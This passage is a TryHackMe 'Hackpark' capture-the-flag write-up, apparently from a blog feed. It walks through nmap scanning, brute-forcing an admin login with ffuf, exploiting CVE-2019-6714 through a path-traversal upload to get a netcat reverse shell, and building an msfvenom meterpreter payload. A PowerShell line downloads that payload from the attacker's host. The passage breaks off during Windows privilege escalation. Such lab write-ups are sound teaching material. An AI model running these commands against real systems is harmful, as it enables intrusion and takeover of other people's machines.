        
        <category>Cryptography</category>
        
        
      </item>
    
      <item>
        <title>THM Hackpark CTF Writeup</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/hackpark&quot;&gt;&lt;strong&gt;Solve Yourself »&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;ENUMERATION&lt;/h1&gt;

&lt;p&gt;Run Network Mapper (&lt;strong&gt;nmap&lt;/strong&gt;) on Hackpark machine to discover opened ports and services.&lt;/p&gt;

&lt;p&gt;Full command :&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;machine IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;outputfile&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Probe open ports to determine service/version info&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SYN, half TCP scan&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-O&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Enable OS detection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;T{0-5} Set scan speed, higher is faster&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scan all 65536 ports&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Skip host discovery&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Write output to a file&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Output of the scan:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Thu Dec 30 14:40:55 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN hackpark.nmap 10.10.123.142&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.123.142
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.033s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JUST GUESSING&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Microsoft Windows 2012 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;89%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;89%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2012 or Windows Server 2012 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;89%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2012 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;89%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;conditions non-ideal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Thu Dec 30 14:43:54 2021 -- 1 IP address (1 host up) scanned in 179.18 seconds&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Two ports opened:&lt;/p&gt;

&lt;h2 id=&quot;port-3389-sslms-wbt-server&quot;&gt;Port 3389 ssl/ms-wbt-server?&lt;/h2&gt;
&lt;p&gt;Port 3389 is running an &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol&quot;&gt;RDP&lt;/a&gt; service.
However, it is not possible to exploit it since we do not have any information about the version of the service.&lt;/p&gt;

&lt;h2 id=&quot;port-80-http-microsoft-iis-httpd-85&quot;&gt;Port 80 http Microsoft IIS httpd 8.5&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Internet_Information_Services&quot;&gt;&lt;strong&gt;Microsoft IIS&lt;/strong&gt;&lt;/a&gt; web server is running on port 80.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;Let us quickly check the &lt;a href=&quot;https://www.cloudflare.com/learning/bots/what-is-robots.txt/&quot;&gt;robots.txt&lt;/a&gt; to see if we can find something interesting.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
Nothing fancy here. Let us move on.
&lt;br /&gt;&lt;br /&gt;&lt;a href=&quot;https://github.com/maurosoria/dirsearch&quot;&gt;Dirsearch&lt;/a&gt; can help us to enumerate subdirectories of the webserver.
Frameworks like &lt;strong&gt;GoBuster&lt;/strong&gt; and &lt;strong&gt;DirBuster&lt;/strong&gt; are also an option.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
The &lt;strong&gt;/admin&lt;/strong&gt; directory might be interesting. However, the request to the directory gets redirected to a &lt;strong&gt;.aspx&lt;/strong&gt; file 
which is probably a login form.
&lt;br /&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/4.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
We will have to launch a &lt;a href=&quot;https://www.fortinet.com/resources/cyberglossary/brute-force-attack&quot;&gt;brute-force&lt;/a&gt; attack in order to
gain access to the backend panel.
&lt;br /&gt;&lt;br /&gt;There is only one blog post published on the main page, and the author of it is the &lt;strong&gt;ADMINISTRATOR&lt;/strong&gt;. 
So we can assume that the only user registered to the panel is the admin’s itself.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;exploitaton&quot;&gt;EXPLOITATON&lt;/h1&gt;

&lt;h2 id=&quot;brute-forcing-the-panel&quot;&gt;Brute-Forcing the Panel&lt;/h2&gt;
&lt;p&gt;In order to create continuous HTTP requests, we have to know how the HTTP request looks.
Launch the &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-burp-suite/&quot;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt; to examine the HTTP POST request sent 
when a login attempt occurs.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/6.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;HTTP Post Request&lt;/em&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4&quot;&gt;&lt;strong&gt;application/x-www-form-urlencoded&lt;/strong&gt;&lt;/a&gt; header : Encoding type&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Username&lt;/strong&gt; : Username field&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Password&lt;/strong&gt; : Password Field&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;However, we need to include all the data section when posting the request. Otherwise we cannot get a healthy
response from the webserver.
I will use &lt;a href=&quot;https://cybersecnerds.com/ffuf-everything-you-need-to-know/&quot;&gt;&lt;strong&gt;ffuf&lt;/strong&gt;&lt;/a&gt; to create POST requests toward the web server.
You can use any fuzzer tool like &lt;strong&gt;THC Hydra&lt;/strong&gt;, &lt;strong&gt;Burp Suite&lt;/strong&gt; or others. 
&lt;br /&gt;Download &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;&lt;strong&gt;SecLists&lt;/strong&gt;&lt;/a&gt; repo with prepeared wordlists included.
Full command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ~/Folders/pentest/SecLists/Passwords/probable-v2-top1575.txt:W1 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.123.142/Account/login.aspx?ReturnURL=/admin/&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VIEWSTATE=RH2j6pTwkTpekqaGFxbyyqhRtNI0NqgguLfakdexSgccBsTJEspUlTZqAM4QgzNfGiTveKSyUR8zQcskqfuAHSnpcldHQ9xwsDFI7TPd9qleqBeLqjTEaf0uWEXMNHGHBar%2Fd4Tpi6vKNeoMnRSF9UgcpGiDPoDm%2BS2kBhsBJqJ47zLb&amp;amp;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;EVENTVALIDATION=iHNLSSqcnyAz7PNrH23YgFZ%2FinxPC1MSAVwjbKwwlbPU53tS7MftBm1t2tI37bKFNo1JvXCIgpZCsBc0Hy0zCU6jPybyZAob4Fm3Pmva7gRSUaDNTTb%2F3QgExGwRutGX4FnCQjvfJVEGodEZUU5p4vr8Xj6oe8MdxUtJM0CobBQGfLLs&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;amp;ctl00%24MainContent%24LoginUser%24Password=W1&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/x-www-form-urlencoded&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fr&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Login failed&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Where:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-w&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Dedicated wordlists&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-u&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Target URL&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-data&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Data which will be sent with the request&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-H&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP headers that will be sent with the request&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-fr&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Regex which will be filtered out&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/8.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Starting the attack&lt;/em&gt;&lt;br /&gt;
Since the password is not strong enough, we have managed to crack it in a matter of seconds.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/10.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Logging in to the panel as the admin.&lt;/em&gt;
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;searching-for-vulnerabilities&quot;&gt;Searching for Vulnerabilities&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/11.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Checking the version of the framework&lt;/em&gt;&lt;br /&gt;
After logging in to the panel, under the About tab, we can see the version of the framework is 3.3.6
&lt;br /&gt;&lt;br /&gt;After gathering the version information, we can check &lt;a href=&quot;https://www.exploit-db.com/exploits&quot;&gt;Exploit-db&lt;/a&gt; to see
if there is any vulnerability on that version. I will use the &lt;strong&gt;searchsploit&lt;/strong&gt; utility, the CLI version
of the Exploit-db.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/12.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
Multiple different exploits showed up. However, the first one is specifically for the version 3.3.6. We are going to
use that. &lt;a href=&quot;https://portswigger.net/web-security/file-path-traversal&quot;&gt;Click to read more about &lt;em&gt;File Path, Directory Traversal&lt;/em&gt;&lt;/a&gt;.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;hacking-into-the-users-shell&quot;&gt;Hacking Into the User’s Shell&lt;/h2&gt;
&lt;p&gt;Download the &lt;a href=&quot;https://www.exploit-db.com/exploits/46353&quot;&gt;CVE-2019-6714&lt;/a&gt; exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/13.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Editing 46353.cs file&lt;/em&gt;&lt;br /&gt;
Rename the file as &lt;strong&gt;PostView.ascx&lt;/strong&gt;.
&lt;br /&gt;&lt;br /&gt;Navigate to the Content tab, then click on the blog post to access the editor.
Interact with the file manager to upload the exploit.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/13-1.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;File manager icon&lt;/em&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/14.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Uploading the exploit&lt;/em&gt;&lt;br /&gt;
&lt;br /&gt;Make sure the post is saved to its’ newer version.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/15.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Updating the blogpost&lt;/em&gt;&lt;br /&gt;
&lt;br /&gt;Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on your machine with the port that is defined in the exploit.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;To trigger the &lt;strong&gt;PostView.ascx&lt;/strong&gt; file and get the reverse shell send a GET request to this
URL: &lt;strong&gt;http://{MACHINE IP}/?theme=../../App_Data/files&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;Exploit worked like a charm, and we got our shell.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/18.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;upgrading-to-the-meterpreter&quot;&gt;Upgrading to the Meterpreter&lt;/h2&gt;
&lt;p&gt;Since the shell we got is a poor Netcat shell, it would be better to get a &lt;strong&gt;meterpreter&lt;/strong&gt; session
to facilitate our scans in the system.&lt;br /&gt;&lt;br /&gt;
Let’s create a meterpreter reverse shell binary with &lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/msfvenom/&quot;&gt;msfvenom&lt;/a&gt;. 
After successful creation, we need to upload this binary to the target machine. The shortest way to 
do it is to start a Python server.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;msfvenom&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--encoder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86/shikata_ga_nai&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOME&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FREE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revshell.exe&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/19.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Creating meterpreter backdoor and starting a Python server&lt;/em&gt;&lt;br /&gt;
&lt;br /&gt;Download the backdoor to the target system with the following Powershell commands:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\Temp&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myfolder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myfolder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Invoke-WebRequest http://{THM IP}:{PORT}/{FILE_NAME} -OutFile .\revshell.exe&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/20.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;We need to have a listener to accept incoming meterpreter connection.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;
handler &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THM IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THE PORT DEFINED IN THE BACKDOOR&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/22.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;Go back to the Netcat console, then run the backdoor as a background process with this command.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/21.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;Excellent! We got the meterpreter session.
Right now, our control on the system is much more powerful than before.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/22-2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&quot;privilege-escelation&quot;&gt;Privilege Escelation&lt;/h2&gt;
&lt;p&gt;After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
permissions against the system. &lt;strong&gt;PowerUp.ps1&lt;/strong&gt; is a program that facilitates fast checks in a windows machine to identify 
any misconfigurations and privilege escalation possibilities.
&lt;br /&gt;&lt;a href=&quot;https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1&quot;&gt;&lt;strong&gt;Download PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;
&lt;br /&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit&quot;&gt;&lt;strong&gt;PowerSploit GitHub Repo&lt;/strong&gt;&lt;/a&gt;
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/23.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Uploading the PowerUp.ps1 Powershell script to the target system.&lt;/em&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;Since this is a Powershell script, we need to have a Powershell instead of a regular windows command prompt.
&lt;br /&gt;-Load the Powershell module and summon it.
&lt;br /&gt;-Import the script as a powershell module.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\PowerUp.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-AllChecks&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/24.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;strong&gt;InvokeAllChecks&lt;/strong&gt; will diagnose any detectable vulnerabilities along with their descriptions.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/25.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;One of the results is worth paying attention to. There is a Windows Scheduler service autoruns at the system logon. 
The problem is that everyone can modify all the files stored in the directory that contains 
W3Scheduler.exe. Since the scheduler is run with admin privileges, 
I can run my malicious executables with admin privileges by replacing the W3Scheduler.exe.
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/26.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;Some resources for autorun exploitation:
&lt;br /&gt;- &lt;a href=&quot;https://steflan-security.com/windows-privilege-escalation-exploiting-autorun/&quot;&gt;Windows Privilege Escalation – Exploiting Autorun&lt;/a&gt;
&lt;br /&gt;- &lt;a href=&quot;https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries&quot;&gt;Privilege Escalation with Autoruns&lt;/a&gt;
&lt;br /&gt;&lt;br /&gt;Let’s check the the &lt;a href=&quot;https://networkencyclopedia.com/discretionary-access-control-list-dacl/&quot;&gt;&lt;strong&gt;DACL(Discretionary Access Control List)&lt;/strong&gt;&lt;/a&gt; of the ‘C:\Program Files (x86)\SystemScheduler’ with &lt;a href=&quot;https://www.techtarget.com/searchwindowsserver/definition/icacls&quot;&gt;&lt;strong&gt;icacls&lt;/strong&gt;&lt;/a&gt;. 
&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/27.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
It is obvious that everyone have modify permission on this folder.
&lt;br /&gt;&lt;br /&gt; Let’s see what the directory contains along with W3Scheduler.exe
